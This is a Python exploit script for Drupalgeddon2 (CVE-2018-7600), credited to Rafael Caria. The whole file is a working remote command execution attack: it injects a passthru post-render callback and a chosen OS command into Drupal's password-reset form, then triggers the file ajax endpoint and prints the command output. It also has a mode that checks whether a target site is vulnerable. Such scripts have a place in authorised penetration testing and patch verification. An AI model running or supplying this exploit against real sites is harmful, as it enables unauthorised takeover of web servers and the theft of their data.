#!/usr/bin/env python3

#Drupal - Drupalgeddon2
#This script exploits (CVE-2018-7600) a Drupal property injection in the Forms API. Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are vulnerable.
#by Rafael Caria

import requests,argparse

G = ("\033[92m")
R = ("\033[91m") 
W = ('\033[0m')

def parser_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url","-u",help="URL of target Drupal site (ex: http://target.com/)",type=str,required=True)
    parser.add_argument("--command","-c",help="OS Command to execute",type=str)
    parser.add_argument("--function","-f",default="passthru",help="Function to use as attack vector (default = passthru)")
    parser.add_argument("--test",help="Test if target is vulnerable",action="store_true")
    parser.add_argument("--proxy","-p",default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)",type=str)
    args = parser.parse_args()
    return args

print ("[+] drupalgeddon2 (CVE-2018-7600) exploit by Rafael Caria")
def exploit(host,command,function,proxy):
    params = {
    'q':'user/password',
    'name[#post_render][]':function,
    'name[#markup]':command,
    'name[#type]':'markup',
    }
    data = {
    'form_id':'user_pass',
    '_triggering_element_name':'name',
    }
    proxies = {"http":proxy}
    r = requests.post(host,proxies=proxies,params=params,data=data,verify=False)
    if (r.status_code == 200):
        print (f"[+] Triggering exploit to execute: {command}")
        form = (r.text.split("form_build_id\" value=\"")[1].split("\"")[0])
        host = (host+"?q=/file/ajax/name/%23value/"+form)
        data = {
        "form_build_id":form}
        r = requests.post(host,proxies=proxies,data=data)
        print ("\n"+r.text.split("[{\"")[0])
    else:
        pass  
def test(host,proxy):
    test = "echo 'testing vuln'"
    params = {
    'q':'user/password',
    'name[#post_render][]':'passthru',
    'name[#markup]':test,
    'name[#type]':'markup',
    }
    data = {
    'form_id':'user_pass',
    '_triggering_element_name':'name',
    }
    proxies = {"http":proxy}
    print ("[+] Sending request to:",host)
    try:
        r = requests.post(host,proxies=proxies,params=params,data=data,verify=False)
        form = (r.text.split("form_build_id\" value=\"")[1].split("\"")[0])
        hosts = (host+"?q=/file/ajax/name/%23value/"+form)
        data = {
        "form_build_id":form
        }
        print (f"[+] Testing if: {host} is vulnerable")
        r = requests.post(hosts,proxies=proxies,data=data)
        result =  (r.text.split("[{\"")[0])
        if ("testing vuln" in result):
            print (f"{R}[!] Target is vulnerable to CVE-2018-7600{W}")
        else:
            print (f"{G}[+] Target not vulnerable{W}")
    except:
        print ("[!] Something went wrong")

def main():
    args = parser_args()
    if args.test:
        test(args.url,args.proxy)
    if args.command:
        exploit(args.url,args.command,args.function,args.proxy)
if __name__ == "__main__":
    main()
